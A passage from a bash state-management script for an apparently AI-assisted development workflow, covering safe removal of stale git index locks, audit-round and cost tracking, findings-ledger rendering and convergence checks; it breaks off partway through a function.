  # its arguments. Adopting either flag's Linux meaning here would silently make this fallback
  # produce PIDs with no command-line text to match on macOS (this project's primary development
  # platform, per CLAUDE.md), so `grep -F` would never match anything and the check would always
  # guess "not held" -- exactly the wrong direction to fail for a check that deletes a file.
  # `ps -o pid=,args=` is POSIX-specified and gives an identical output shape on both platforms.
  # This process's own PID and parent PID are excluded from the candidate set so this command's
  # own invocation (or its parent shell) can never count as holder evidence for itself.
  local holder_evidence=""
  local _have_lsof=0 _have_pgrep=0
  command -v lsof >/dev/null 2>&1 && _have_lsof=1
  command -v pgrep >/dev/null 2>&1 && _have_pgrep=1

  if [[ $_have_lsof -eq 0 && $_have_pgrep -eq 0 ]]; then
    echo "WARNING: liveness could not be determined for .git/index.lock (age: ${lock_age_desc}) -- neither lsof nor pgrep is available on this host; refusing to remove rather than guessing" >&2
    return 1
  fi

  if [[ $_have_lsof -eq 1 ]]; then
    holder_evidence="$(lsof -- "$lock_file" 2>/dev/null | tail -n +2 || true)"
  fi
  if [[ -z "$holder_evidence" && $_have_pgrep -eq 1 ]]; then
    local _candidate_pids _pgrep_rc=0 _pgrep_out=""
    # G10/CA-251 (round 5, residual): pgrep's own exit code must be distinguished, not
    # swallowed uniformly by a trailing `|| true`. Exit 1 is pgrep's documented "no processes
    # matched" result -- the expected, common case once a lock is genuinely stale -- and is
    # safe to treat as an empty candidate list. Any OTHER non-zero exit (an invalid extended
    # regex in $git_dir -- an unbalanced bracket, a trailing backslash -- exits non-1 on both
    # GNU and BSD pgrep) must NOT be treated the same way: silently swallowing it previously
    # left the candidate list empty with no liveness check having actually run at all,
    # indistinguishable from the genuinely-stale case, reachable on every host lacking lsof
    # (common on Alpine and in CI).
    _pgrep_out="$(pgrep -f -- "$git_dir" 2>/dev/null)" || _pgrep_rc=$?
    if [[ $_pgrep_rc -gt 1 ]]; then
      echo "WARNING: liveness could not be determined for .git/index.lock (age: ${lock_age_desc}) -- pgrep exited ${_pgrep_rc}, not its documented 'no processes matched' exit of 1; refusing to remove rather than guessing" >&2
      return 1
    fi
    _candidate_pids="$(printf '%s' "$_pgrep_out" | tr '\n' ',' | sed 's/,$//')"
    if [[ -n "$_candidate_pids" ]]; then
      holder_evidence="$(ps -o pid=,args= -p "$_candidate_pids" 2>/dev/null \
        | grep -F -- "$git_dir" \
        | awk -v me="$$" -v parent="$PPID" '$1 != me && $1 != parent' \
        || true)"
    fi
  fi

  if [[ -n "$holder_evidence" ]]; then
    echo "WARNING: .git/index.lock exists (age: ${lock_age_desc}) and possible holder evidence was found for ${git_dir}:" >&2
    echo "$holder_evidence" >&2
    echo "Do not remove the lock while git is active; wait for the process to finish." >&2
    return 1
  fi

  # G10/CA-251 (round 5, residual): re-assert the age gate immediately before the mv-aside,
  # not just once at function entry. The liveness probe above (lsof and/or pgrep+ps) can take
  # tens to hundreds of milliseconds; if a concurrent remover cleared this stale lock and git
  # re-acquired it inside that window, proceeding straight to the mv below would rename git's
  # brand-new LIVE lock aside and delete it, permitting a second concurrent index write. A lock
  # file that has disappeared entirely in that window is the existing, already-safe "someone
  # else already removed it" case the mv's own failure branch below handles; only a lock file
  # that still EXISTS but now reads younger than the threshold is the residual this re-check
  # closes.
  if [[ ! -f "$lock_file" ]]; then
    echo "$lock_file was already removed before this process could act; nothing to do"
    return 0
  elif find "$lock_file" -mmin +0 2>/dev/null | grep -q .; then
    : # still older than ~60s immediately before the mv -- safe to proceed
  else
    echo "WARNING: .git/index.lock now reads less than a minute old (re-checked immediately before removal) -- a concurrent process re-acquired it during the liveness probe; leaving in place" >&2
    return 1
  fi

  echo "stale .git/index.lock detected (age: ${lock_age_desc}, no holder evidence found for ${git_dir}); removing..."
  # G43: atomic mv-aside-then-remove -- the same idiom with_state_lock's stale-lockdir
  # reclaim uses (_edm_reclaim_stale_lockdir above) -- instead of a bare `rm -f`. A
  # losing racer that reaches this point just after a legitimate git process re-took
  # the lock renames whatever currently occupies the path rather than deleting a name
  # a winner just (re-)created out from under it; the mv either succeeds outright or
  # fails because the file is already gone, and either outcome is safe. The age re-check
  # immediately above already closes the "renamed a brand-new live lock" window; this mv
  # failure branch now only covers the file having disappeared in the few instructions
  # between that re-check and this mv.
  local stale_aside="${lock_file}.stale.$$"
  if mv "$lock_file" "$stale_aside" 2>/dev/null; then
    rm -f "$stale_aside"
    echo "removed $lock_file"
  else
    echo "$lock_file was already removed or replaced by another process; nothing to do"
  fi
}

# ---- Current step tracking (T47) --------------------------------------------
# current-step <PREFIX> [<step>]
# Without <step>: print current_step (empty when not yet set -- lazy init).
# With <step>: store current_step; typed as number if numeric, otherwise string.
# current_step is intentionally ABSENT from cmd_init so it is only set when the
# orchestrator explicitly records progress -- never pre-initialised to 0.

cmd_current_step() {
  [[ $# -ge 1 ]] || die "usage: edm-state current-step <PREFIX> [<step>]"
  require_jq
  local prefix="$1"
  if [[ $# -eq 1 ]]; then
    # Read mode -- current_step // "" gives empty string on missing field (null).
    read_state "$prefix" | jq -r '.current_step // ""'
    return 0
  fi
  local step="$2"
  if [[ "$step" =~ ^-?[0-9]+(\.[0-9]+)?$ ]]; then
    rmw_state "$prefix" '.current_step = ($v|tonumber) | .last_updated = $t' --arg v "$step" --arg t "$(now_utc)"
  else
    rmw_state "$prefix" '.current_step = $v | .last_updated = $t' --arg v "$step" --arg t "$(now_utc)"
  fi
}

# ---- Session start (T50) ----------------------------------------------------
# session-start
# Emits Resume Point for any active initiatives (phase 1-6).
# Called headlessly from the SessionStart hook at the start of every conversation.
# Scans both flat (SRD/*/) and product-scoped (SRD/*/*/) layouts and de-duplicates.

cmd_session_start() {
  [[ -d "$SRD_ROOT" ]] || return 0
  require_jq
  local active_count=0
  local seen_prefixes=()
  # Enumerate both layouts via the single shared helper (CA-011); dedup by prefix below.
  while IFS= read -r state; do
    [[ -f "$state" ]] || continue
    local prefix phase
    prefix="$(jq -r '.prefix // "unknown"' "$state" 2>/dev/null || echo unknown)"
    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
    # De-duplicate by prefix (both layouts may resolve to the same initiative).
    local already=0
    local seen
    for seen in "${seen_prefixes[@]+"${seen_prefixes[@]}"}"; do
      [[ "$seen" == "$prefix" ]] && already=1 && break
    done
    [[ $already -eq 1 ]] && continue
    [[ "$phase" -ge 1 && "$phase" -le 6 ]] || continue
    seen_prefixes+=("$prefix")
    active_count=$((active_count + 1))
    if [[ $active_count -eq 1 ]]; then
      echo "# EDM Active Initiative(s) -- Session Resume"
      echo
    fi
    local current_step last_decision last_updated phase_name
    current_step="$(jq -r '.current_step // ""' "$state" 2>/dev/null || echo '')"
    last_decision="$(jq -r '.last_decision // ""' "$state" 2>/dev/null || echo '')"
    last_updated="$(jq -r '.last_updated // ""' "$state" 2>/dev/null || echo '')"
    phase_name="$(phase_name_for "$phase")"
    printf '## %s -- %s\n' "$prefix" "$phase_name"
    [[ -n "$current_step" ]]   && printf '  Step:          %s\n' "$current_step"
    [[ -n "$last_decision" ]]  && printf '  Last decision: %s\n' "$last_decision"
    [[ -n "$last_updated" ]]   && printf '  Last updated:  %s\n' "$last_updated"
    # Render state anomalies, both classes, visually distinguished (EDMV3-T05 AC6).
    # Read-only: state_anomalies never mutates state.
    local _ss_anomalies _ss_aline
    _ss_anomalies="$(state_anomalies "$prefix" 2>/dev/null || true)"
    if [[ -n "$_ss_anomalies" ]]; then
      while IFS= read -r _ss_aline; do
        [[ -n "$_ss_aline" ]] || continue
        format_anomaly_line "$_ss_aline"
      done <<< "$_ss_anomalies"
    fi
    printf '  Resume:        /edm:orchestrator %s\n' "$prefix"
    echo
  done < <(list_state_files)
}

# ---- Findings ledger rendering (EDMV3-T26) ----------------------------------
# render-ledger <PREFIX>
# Reads code-audit/findings-ledger.jsonl (the authoritative source, EDMV3-T25) and
# deterministically renders code-audit/findings-ledger.md. The markdown is a pure projection,
# rebuilt from scratch on every call -- a hand-edit is silently overwritten on the next render
# (AC5), which is what proves the JSONL, not the markdown, is the source of truth.
_render_ledger_markdown() {
  local prefix="$1" body="$2"
  echo "# Code Audit Findings Ledger: ${prefix}"
  echo ""
  echo "<!-- GENERATED FILE -- rendered by 'edm-state render-ledger' from findings-ledger.jsonl. Do not hand-edit; edits are overwritten on the next render. -->"
  echo ""
  printf '%s\n' "$body"
}

cmd_render_ledger() {
  [[ $# -eq 1 ]] || die "usage: edm-state render-ledger <PREFIX>"
  require_jq
  local prefix="$1"
  local init_dir jsonl_path md_path
  init_dir="$(initiative_dir_for "$prefix")"
  jsonl_path="${init_dir}/code-audit/findings-ledger.jsonl"
  md_path="${init_dir}/code-audit/findings-ledger.md"

  # AC10: distinguish "no audit has run" from "the render failed"; writes nothing either way.
  if [[ ! -f "$jsonl_path" ]]; then
    die "render-ledger: no code audit has run for ${prefix} (missing findings-ledger.jsonl at ${jsonl_path}); nothing rendered"
  fi

  # Ordering is total, not just by severity (Technical Notes): sort_by([sev_rank, .id]) so two
  # P1s with adjacent IDs never swap between runs (AC2, determinism).
  local body
  if ! body="$(jq -rs '
      def coerce_status: if .status == "deferred" then (.status = "open") else . end;
      def sev_rank: if .sev == "P0" then 0 elif .sev == "P1" then 1 elif .sev == "P2" then 2 else 3 end;
      (map(coerce_status) | sort_by([sev_rank, .id])) as $sorted
      | ($sorted | map(select(.sev != "NOTED"))) as $findings
      | ($sorted | map(select(.sev == "NOTED"))) as $noted
      | (
          ["| ID | Severity | Status | Lens(es) | Component | Summary | Raised Round | Resolved Round |",
           "|----|----------|--------|----------|-----------|---------|--------------|----------------|"]
          + ($findings | map(
              "| \(.id) | \(.sev) | \(.status) | \(.lenses | join("+")) | \(.component // "(missing)") | \(.title) | \(.raised_round // "") | \(.resolved_round // "") |"
            ))
        ) as $table
      | (
          ["", "## Decisions / Non-Findings", "",
           "Findings demoted to Not Actionable by the False Alarm Filter. Future audits should NOT re-investigate them."]
          + (if ($noted | length) == 0
             then ["", "(none)"]
             else (["" ] + ($noted | to_entries | map(
                     "\(.key + 1). **\(.value.title)** (\(.value.id), \(.value.lenses | join("+"))) -- \(.value.component // "(missing)")"
                   )))
             end)
        ) as $decisions
      | ($table + $decisions) | .[]
    ' "$jsonl_path" 2>/dev/null)"; then
    die "render-ledger: failed to render ledger for ${prefix} (invalid JSONL at ${jsonl_path}); nothing written"
  fi

  # AC6: atomic write -- temp file plus rename, matching the discipline used elsewhere in this
  # script (_rmw_state_body, cmd_init).
  mkdir -p "${init_dir}/code-audit"
  write_atomic "$md_path" _render_ledger_markdown "$prefix" "$body" || die "render-ledger: failed to write ${md_path}"

  # AC4: reuse record_artifact_hash (bin/edm-state:~131) so cmd_checkpoint's existing drift
  # loop warns on an out-of-band hand-edit -- the detection machinery is not re-implemented.
  record_artifact_hash "$prefix" "findings_ledger" "${init_dir}/code-audit/findings-ledger.md"
  echo "rendered ${init_dir}/code-audit/findings-ledger.md"
}

# ---- Audit round tracking (T56, widened EDMV3-T27) --------------------------
# audit-round-start <PREFIX> <code|srd|tickets> [--lenses <comma-list>]
# Increments the round counter for the given audit type and echoes the new round number
# (unchanged external contract: `N=$(edm-state audit-round-start <PREFIX> code)`). Additively
# (EDMV3-T27 AC1) records the round's lens set and derived round_type -- full when all eleven
# lenses ran (or --lenses was omitted, matching skills/code-audit/SKILL.md's existing "absence
# of --lenses means run all 11" convention), partial otherwise -- inside audit_rounds.<type>,
# which this ticket widens from a bare integer to {count, rounds: [...]} (AC1a, the sanctioned
# C-4 type widening; see AUDIT_ROUND_COERCE_JQ_DEF above). No existing file is rewritten by this
# widening -- every reader coerces at read time, including this command's own read of a
# pre-existing bare-integer count on its very first post-upgrade call.

_cmd_audit_round_start_body() {
  local f="$1" audit_type="$2" lenses_json="$3" round_type="$4" ts="$5"
  _rmw_state_body "$f" "
      ${AUDIT_ROUND_COERCE_JQ_DEF}
      (.audit_rounds[\$t] // 0 | coerce_round_entry) as \$existing
      | (\$existing.count + 1) as \$new_count
      | .audit_rounds[\$t] = {
          count: \$new_count,
          rounds: (\$existing.rounds + [{round: \$new_count, lenses: \$lenses, round_type: \$rt, started_at: \$ts}])
        }
      | .last_updated = \$ts
    " --arg t "$audit_type" --argjson lenses "$lenses_json" --arg rt "$round_type" --arg ts "$ts" || return 1
  jq -r --arg t "$audit_type" "${AUDIT_ROUND_COERCE_JQ_DEF} (.audit_rounds[\$t] // 0 | coerce_round_entry).count" "$f"
}

cmd_audit_round_start() {
  [[ $# -ge 2 ]] || die "usage: edm-state audit-round-start <PREFIX> <code|srd|tickets> [--lenses <comma-list>]"
  require_jq
  local prefix="$1" audit_type="$2"
  shift 2
  case "$audit_type" in
    code|srd|tickets) ;;
    *) die "audit-round-start: unknown audit type '$audit_type' (expected: code|srd|tickets)" ;;
  esac

  local lenses_arg=""
  if [[ $# -gt 0 ]]; then
    case "$1" in
      --lenses)
        [[ $# -eq 2 && -n "${2:-}" ]] || die "audit-round-start: --lenses requires a non-empty comma-separated value"
        lenses_arg="$2"
        ;;
      *) die "audit-round-start: unknown argument '$1' (expected: --lenses <comma-list>)" ;;
    esac
  fi

  local lenses_json round_type
  if [[ -z "$lenses_arg" ]]; then
    # No --lenses given: full round by definition (mirrors skills/code-audit/SKILL.md step 1's
    # existing "if --lenses is omitted, run all 11" rule). Also the correct default for the
    # srd/tickets audit types, which have no lens concept at all.
    lenses_json="[]"
    round_type="full"
  else
    local normalized_lenses
    normalized_lenses="$(printf '%s' "$lenses_arg" | tr ',' '\n' | sed -e 's/^[ \t]*//' -e 's/[ \t]*$//' | grep -v '^$' || true)"
    [[ -n "$normalized_lenses" ]] || die "audit-round-start: --lenses must contain at least one non-empty lens ID"
    lenses_json="$(printf '%s\n' "$normalized_lenses" | jq -R . | jq -s .)"
    local given_sorted all_sorted
    given_sorted="$(printf '%s' "$lenses_json" | jq -r 'sort | join(",")')"
    # shellcheck disable=SC2086 -- deliberate word-splitting; bash 3.2 has no arrays-as-constants
    all_sorted="$(printf '%s\n' $ALL_LENS_IDS | sort | tr '\n' ',' | sed 's/,$//')"
    if [[ "$given_sorted" == "$all_sorted" ]]; then
      round_type="full"
    else
      round_type="partial"
    fi
  fi

  local ts f lockbase
  ts="$(now_utc)"
  f="$(state_file_for "$prefix")"
  lockbase="${f%.json}"
  with_state_lock "$lockbase" _cmd_audit_round_start_body "$f" "$audit_type" "$lenses_json" "$round_type" "$ts"
}

# audit-round-complete <PREFIX> <code|srd|tickets> (EDMV3-T51)
# Closes the most recently started round of the given audit type: records completion
# timestamp, duration, token/cost totals, keyed by round number within
# .audit_rounds[type].rounds[]. The double-completion check reads the file and decides INSIDE
# the single with_state_lock acquisition below (not as a separate unlocked pre-check before the
# lock), so a double completion is refused before any write happens and mutates nothing (AC9).
# CA-059: cmd_record_partial_verdict's `close` path (_cmd_record_partial_verdict_close_body,
# same file) now follows this identical shape rather than a comment naming a specific line
# number, which is what had gone stale here before -- refer to that function by name, not by a
# line reference that the next edit in either function would immediately invalidate again.
_cmd_audit_round_complete_body() {
  local f="$1" prefix="$2" audit_type="$3" now_ts="$4"
  local state_json existing_rounds last_round round_num started_at already_completed_at
  state_json="$(cat "$f" 2>/dev/null || echo '{}')"
  existing_rounds="$(echo "$state_json" | jq -c --arg t "$audit_type" "${AUDIT_ROUND_COERCE_JQ_DEF} (.audit_rounds[\$t] // 0 | coerce_round_entry).rounds")"
  last_round="$(echo "$existing_rounds" | jq -c 'if length > 0 then .[-1] else null end')"
  [[ "$last_round" != "null" ]] \
    || { echo "audit-round-complete: no ${audit_type} audit round started for ${prefix}; run edm-state audit-round-start ${prefix} ${audit_type} first" >&2; return 1; }
  round_num="$(echo "$last_round" | jq -r '.round')"
  started_at="$(echo "$last_round" | jq -r '.started_at // empty')"
  already_completed_at="$(echo "$last_round" | jq -r '.completed_at // empty')"
  [[ -z "$already_completed_at" ]] \
    || { echo "audit-round-complete: ${audit_type} round ${round_num} for ${prefix} is already completed (at ${already_completed_at}); a round may be completed only once" >&2; return 1; }

  local input=0 output=0 cache_read=0 cw5m=0 cw1h=0 model="unknown" cost="0.0000" attribution_mode="whole-directory" unparseable_lines=0
  if [[ -n "$started_at" ]]; then
    local tokens
    tokens="$(get_session_tokens_since "$started_at")"
    _unpack_token_fields "$tokens"
    input="$_EDM_TOKENS_INPUT"; output="$_EDM_TOKENS_OUTPUT"; cache_read="$_EDM_TOKENS_CACHE_READ"
    cw5m="$_EDM_TOKENS_CACHE_WRITE_5M"; cw1h="$_EDM_TOKENS_CACHE_WRITE_1H"; model="$_EDM_TOKENS_MODEL"
    attribution_mode="$_EDM_TOKENS_ATTRIBUTION_MODE"; unparseable_lines="$_EDM_TOKENS_UNPARSEABLE_LINES"
    cost="$(compute_cost_usd "$model" "$input" "$output" "$cache_read" "$cw5m" "$cw1h")"
  fi

  _rmw_state_body "$f" "
      ${AUDIT_ROUND_COERCE_JQ_DEF}
      (.audit_rounds[\$t] // 0 | coerce_round_entry) as \$existing
      | (\$existing.rounds | map(
          if .round == (\$rn | tonumber) then
            . + {
              completed_at: \$ts,
              duration_seconds: (if .started_at then ((\$ts | fromdateiso8601) - (.started_at | fromdateiso8601)) else 0 end),
              tokens: {input: (\$i|tonumber), output: (\$o|tonumber), cache_read: (\$cr|tonumber), cache_write_5m: (\$c5|tonumber), cache_write_1h: (\$c1|tonumber)},
              model_used: \$model,
              estimated_cost_usd: (\$cost|tonumber),
              attribution_mode: \$am,
              unparseable_lines: (\$ul|tonumber)
            }
          else . end
        )) as \$new_rounds
      | .audit_rounds[\$t] = (\$existing + {rounds: \$new_rounds})
      | .last_updated = \$ts
    " --arg t "$audit_type" --arg rn "$round_num" --arg ts "$now_ts" \
      --arg i "$input" --arg o "$output" --arg cr "$cache_read" --arg c5 "$cw5m" --arg c1 "$cw1h" \
      --arg model "$model" --arg cost "$cost" --arg am "$attribution_mode" \
      --arg ul "$unparseable_lines" || return 1

  printf '%s\t%s\n' "$round_num" "$cost"
}

cmd_audit_round_complete() {
  [[ $# -eq 2 ]] || die "usage: edm-state audit-round-complete <PREFIX> <code|srd|tickets>"
  require_jq
  local prefix="$1" audit_type="$2"
  case "$audit_type" in
    code|srd|tickets) ;;
    *) die "audit-round-complete: unknown audit type '$audit_type' (expected: code|srd|tickets)" ;;
  esac

  local now_ts f lockbase complete_result round_num cost
  now_ts="$(now_utc)"
  f="$(state_file_for "$prefix")"
  lockbase="${f%.json}"
  complete_result="$(with_state_lock "$lockbase" _cmd_audit_round_complete_body "$f" "$prefix" "$audit_type" "$now_ts")" || return 1
  round_num="${complete_result%%$'\t'*}"
  cost="${complete_result#*$'\t'}"
  echo "recorded completion: ${audit_type} round ${round_num} for ${prefix} (\$${cost})"
}

# ---- Convergence query (EDMV3-T28) ------------------------------------------
# audit-converged <PREFIX>
# Read-only (EDMV3-92 AC3: takes no lock, mutates nothing). Computes whether the code-audit
# ledger has converged by querying code-audit/findings-ledger.jsonl against the single shared
# blocking-set predicate defined above, replacing "a human re-reads the ledger and asserts
# convergence in prose" with one deterministic jq query.
# Exit codes (EDMV3-100 -- 2 is never used, reserved for usage/environment errors elsewhere):
#   0 = converged (or this mode/lifecycle_mode does not require a code audit at all)
#   1 = blocking findings remain, OR the latest round was partial/unknown, OR a line carries
#       an out-of-enum status
#   3 = no findings-ledger.jsonl exists (either no audit has run, or only a legacy markdown
#       ledger exists)
cmd_audit_converged() {
  [[ $# -eq 1 ]] || die "usage: edm-state audit-converged <PREFIX>"
  require_jq
  local prefix="$1"
  local state mode lifecycle_mode schema_version
  state="$(read_state "$prefix")"
  mode="$(echo "$state" | jq -r '.mode // "null"')"
  lifecycle_mode="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
  schema_version="$(echo "$state" | jq -r '.schema_version // empty')"

  # AC8: audit-free modes exit 0 with the exemption wording, checked first -- there is no
  # ledger to converge when this mode/lifecycle_mode's phase graph never runs a code-audit
  # round at all. Shares convergence_exempt() with cmd_archive rather than mirroring it, so the
  # two cannot answer the same question differently.
  if [[ "$(convergence_exempt "$mode" "$lifecycle_mode")" == "true" ]]; then
    echo "no code audit is required for this mode (${mode}/${lifecycle_mode})"
    return 0
  fi

  local init_dir jsonl_path md_path schema_class2
  init_dir="$(initiative_dir_for "$prefix")"
  jsonl_path="${init_dir}/code-audit/findings-ledger.jsonl"
  md_path="${init_dir}/code-audit/findings-ledger.md"
  schema_class2="$(schema_at_least "$schema_version" 2)"

  # AC6/AC7: missing jsonl -- distinguish "no audit has run" from "legacy markdown-only ledger,
  # not a fresh-audit demand" (a legacy initiative below schema_version 2 degrades per EDMV3-11
  # rather than being told to run a fresh eleven-lens opus round).
  if [[ ! -f "$jsonl_path" ]]; then
    if [[ "$schema_class2" != "2" && -f "$md_path" ]]; then
      echo "edm-state audit-converged: [warn] legacy initiative (schema_version ${schema_version:-absent}) for ${prefix} -- only a markdown ledger found at ${md_path}; this is not a fresh-audit demand, migrate via a normal code-audit round when convenient" >&2
      return 3
    fi
    echo "edm-state audit-converged: no code audit has run for ${prefix} (missing findings-ledger.jsonl at ${jsonl_path})" >&2
    return 3
  fi

  # AC5 (true out-of-enum status is a parse-level refusal; a legacy `deferred` line is NOT an
  # error here -- it is re-opened below and shows up in the blocking set naturally, per
  # EDMV3-T25 AC4 / EDMV3-T28 AC5).
  local invalid_lines
  if ! invalid_lines="$(jq -r '
      .[] | select(.status != "open" and .status != "fixed" and .status != "noted" and .status != "deferred") |
      "\(.id) \(.status)"
    ' -s "$jsonl_path" 2>/dev/null)"; then
    echo "edm-state audit-converged: invalid JSONL at ${jsonl_path}" >&2
    return 1
  fi
  if [[ -n "$invalid_lines" ]]; then
    echo "edm-state audit-converged: invalid status on finding(s) for ${prefix} (expected: open|fixed|noted):" >&2
    printf '%s\n' "$invalid_lines" | while IFS=' ' read -r bad_id bad_status; do
      [[ -n "$bad_id" ]] && echo "  ${bad_id}: status '${bad_status}'" >&2
    done
    return 1
  fi

  # AC4/AC6: the latest recorded round for the "code" audit type must be full. "unknown" covers
  # both a bare-integer legacy count (coerced to rounds: [], AC1a) and a round entry recorded
  # without a round_type -- gated by schema_version the same way every other wave-B check is.
  local jq_round_filter round_info latest_round_type latest_lenses_csv
  jq_round_filter="$AUDIT_ROUND_COERCE_JQ_DEF"'
    (.audit_rounds.code // 0 | coerce_round_entry) as $e
    | (($e.rounds[-1].round_type // "unknown") + "|" + (($e.rounds[-1].lenses // []) | join(",")))
  '
  round_info="$(echo "$state" | jq -r "$jq_round_filter")"
  latest_round_type="${round_info%%|*}"
  latest_lenses_csv="${round_info#*|}"

  if [[ "$latest_round_type" == "unknown" ]]; then
    if [[ "$schema_class2" == "2" ]]; then
      echo "edm-state audit-converged: latest code-audit round has an unknown round_type for ${prefix}; run a full (eleven-lens) code-audit round before checking convergence" >&2
      return 1
    fi
    echo "edm-state audit-converged: [warn] latest code-audit round has an unknown round_type for ${prefix} (schema_version ${schema_version:-absent} < 2) -- proceeding without the round-type gate" >&2
  elif [[ "$latest_round_type" == "partial" ]]; then
    echo "edm-state audit-converged: last round was partial (lenses: ${latest_lenses_csv}); a full round is required for convergence" >&2
    return 1
  fi

  # AC1/AC2/AC9: the blocking-set computation. References the shared predicate constant by name
  # (defined once above) -- the single definition every consumer (this command,
  # cmd_approve_gate's code-audit branch, cmd_archive's convergence check, and
  # write_handoff_internal's Phase-6 rendering) shares.
  local jq_blocking_filter result_json
  jq_blocking_filter='
    def coerce_status: if .status == "deferred" then (.status = "open") else . end;
    map(coerce_status) as $all
    | ($all | map(select('"$BLOCKING_FILTER"'))) as $blocking
    | {
        total: ($all | length),
        noted: ([$all[] | select(.sev == "NOTED")] | length),
        blocking_count: ($blocking | length),
        p0: ([$blocking[] | select(.sev == "P0")] | length),
        p1: ([$blocking[] | select(.sev == "P1")] | length),
        p2: ([$blocking[] | select(.sev == "P2")] | length),
        blocking_list: ($blocking | map("\(.id) \(.sev) \(.title)"))
      }
  '
  if ! result_json="$(jq -s "$jq_blocking_filter" "$jsonl_path" 2>/dev/null)"; then
    echo "edm-state audit-converged: invalid JSONL at ${jsonl_path}" >&2
    return 1
  fi

  local total blocking_count p0 p1 p2 noted_count
  total="$(echo "$result_json" | jq -r '.total')"
  blocking_count="$(echo "$result_json" | jq -r '.blocking_count')"
  p0="$(echo "$result_json" | jq -r '.p0')"
  p1="$(echo "$result_json" | jq -r '.p1')"
  p2="$(echo "$result_json" | jq -r '.p2')"
  noted_count="$(echo "$result_json" | jq -r '.noted')"

  if [[ "$blocking_count" -eq 0 ]]; then
    # AC6: distinguish "no findings recorded" from "findings recorded, none blocking".
    if [[ "$total" -eq 0 ]]; then
      echo "converged: no findings recorded in the ledger for ${prefix} (0 total, 0 NOTED)"
    else
      echo "converged: ${total} finding(s) considered for ${prefix}, 0 blocking (P0/P1/P2 open), ${noted_count} NOTED excluded"
    fi
    return 0
  fi

  echo "not converged: ${blocking_count} blocking finding(s) for ${prefix} (P0=${p0} P1=${p1} P2=${p2}) of ${total} considered, ${noted_count} NOTED excluded:" >&2
  echo "$result_json" | jq -r '.blocking_list[]' | while IFS= read -r bl; do
    echo "  ${bl}" >&2
  done
  return 1
}

# ---- Partial verdict tracking (T67, closure support EDMV3-T32) --------------
# record-partial-verdict <PREFIX> <ticket> <PASS|PARTIAL|FAIL> [<note>]         -- open/record
# record-partial-verdict <PREFIX> <ticket> close <PASS|FAIL> <verification_ref> -- close
# The first (existing, unchanged, AC6) form persists a per-ticket verdict into
# partial_verdict_map. The second (new, EDMV3-T32) form closes an existing PARTIAL entry: the
# literal third argument "close" disambiguates it from a verdict (never a legal value of the
# first form), so hooks/hooks.json:117 and skills/implement/SKILL.md:117 -- both single-write
# callers of the first form -- are unaffected.

# _cmd_record_partial_verdict_close_body <state-file> <prefix> <ticket> <closing-verdict>
#                                         <verification-ref> <now-ts>
# Runs INSIDE with_state_lock (CA-059, mirroring _cmd_audit_round_complete_body's shape above):
# the unknown-ticket (AC5) and already-closed (AC3) decisions read $f fresh under the lock and
# refuse -- mutating nothing -- before _rmw_state_body is ever called, instead of the previous
# unlocked read_state pre-check followed by a separately-locked rmw_state call. That older shape
# left a check-then-lock race: two concurrent `close` calls on the same entry could both pass the
# unlocked "not yet closed" pre-check before either acquired the lock, so both would take the
# first-closure branch and the second writer would silently overwrite the first, violating the
# documented close-once invariant with no error to either caller. Calls _rmw_state_body directly
# rather than rmw_state, since with_state_lock already holds the lock for this whole function --
# going through rmw_state here would attempt to re-acquire it and deadlock (mkdir branch) or at
# minimum defeat the point of doing the check and the write under the same acquisition.
_cmd_record_partial_verdict_close_body() {
  local f="$1" prefix="$2" ticket="$3" closing_verdict="$4" verification_ref="$5" now_ts="$6"
  local state_json existing already_closed already_closing_verdict already_closed_at prior_verdict

  state_json="$(cat "$f" 2>/dev/null || echo '{}')"
  existing="$(echo "$state_json" | jq -c --arg tk "$ticket" '.partial_verdict_map[$tk] // null')"
  # AC5: unknown ticket exits non-zero and mutates nothing.
  [[ "$existing" != "null" ]] \
    || { echo "record-partial-verdict close: unknown ticket '${ticket}' for ${prefix} (no entry in partial_verdict_map)" >&2; return 1; }

  already_closed="$(echo "$existing" | jq -r 'has("closing_verdict")')"
  already_closing_verdict="$(echo "$existing" | jq -r '.closing_verdict // ""')"
  already_closed_at="$(echo "$existing" | jq -r '.closed_at // "unknown"')"
  prior_verdict="$(echo "$existing" | jq -r '.verdict // .prior.verdict // "PARTIAL"')"

  if [[ "$already_closed" == "true" ]]; then
    if [[ "$already_closing_verdict" != "FAIL" ]]; then
      # AC3: an entry may be closed only once -- refused naming the existing closure. The sole
      # sanctioned exception (AC4, below) is re-closing an entry whose existing closure was FAIL.
      echo "record-partial-verdict close: ${ticket} is already closed (${already_closing_verdict} at ${already_closed_at}) for ${prefix}; an entry may be closed only once unless the existing closure was FAIL" >&2
      return 1
    fi
    # AC4: FAIL-closed entries may be re-closed after remediation; the closure this call is
    # about to make is appended to a closure history array rather than overwriting the prior
    # closure, so the FAIL record is never lost.
    _rmw_state_body "$f" '
      .partial_verdict_map[$tk] as $e
      | .partial_verdict_map[$tk] = (
          $e
          | .closure_history = ((.closure_history // [{closing_verdict: .closing_verdict, closed_at: .closed_at, verification_ref: .verification_ref}]) + [{closing_verdict: $cv, closed_at: $ts, verification_ref: $ref}])
          | .closing_verdict = $cv
          | .closed_at = $ts
          | .verification_ref = $ref
        )
      | .last_updated = $ts
    ' --arg tk "$ticket" --arg cv "$closing_verdict" --arg ref "$verification_ref" --arg ts "$now_ts" || return 1
    printf 're-closed\t%s\n' "$prior_verdict"
    return 0
  fi

  # AC1/AC2: first closure -- nest the whole original entry under `prior` (not just the note, so
  # a future field added to the open shape survives closure automatically) rather than
  # overwriting it, alongside the new closing_verdict/closed_at/verification_ref.
  _rmw_state_body "$f" '
    .partial_verdict_map[$tk] as $e
    | .partial_verdict_map[$tk] = {
        prior: $e,
        closing_verdict: $cv,
        closed_at: $ts,
        verification_ref: $ref
      }
    | .last_updated = $ts
  ' --arg tk "$ticket" --arg cv "$closing_verdict" --arg ref "$verification_ref" --arg ts "$now_ts" || return 1
  printf 'closed\t%s\n' "$prior_verdict"
}

cmd_record_partial_verdict() {
  [[ $# -ge 3 ]] || die "usage: edm-state record-partial-verdict <PREFIX> <ticket> <PASS|PARTIAL|FAIL> [<note>]  |  edm-state record-partial-verdict <PREFIX> <ticket> close <PASS|FAIL> <verification_ref>"
  require_jq
  local prefix="$1" ticket="$2" verdict_or_close="$3"

  if [[ "$verdict_or_close" == "close" ]]; then
    [[ $# -eq 5 ]] || die "usage: edm-state record-partial-verdict <PREFIX> <ticket> close <PASS|FAIL> <verification_ref>"
    local closing_verdict="$4" verification_ref="$5"
